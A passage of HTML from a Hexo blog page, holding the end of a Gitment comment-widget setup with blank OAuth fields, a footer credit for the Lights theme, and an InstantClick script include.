            owner: "",
            repo: "",
            oauth: {
              client_id: "",
              client_secret: "",
            },
          })
          gitment.render('gitment');
          var loadcmt = document.getElementById("loadcmts");
          var imyourfather = loadcmt.parentNode;
          imyourfather.removeChild(loadcmts)
        }
      }
    </script>
  </section>


	<footer id="footer">
	<div id="social">
		<p class="small">©  kpa1on| Powered by Hexo & 
			<a target="_blank" rel="noopener" href="https://github.com/F0r3at/Lights"> Lights</a>
		</p>
	</div>
</footer>

</section>

	<script src="//cdnjs.loli.net/ajax/libs/instantclick/3.0.1/instantclick.min.js" data-no-instant></script>
	<script data-no-instant>
		
		InstantClick.init('mousedown');
	</script>



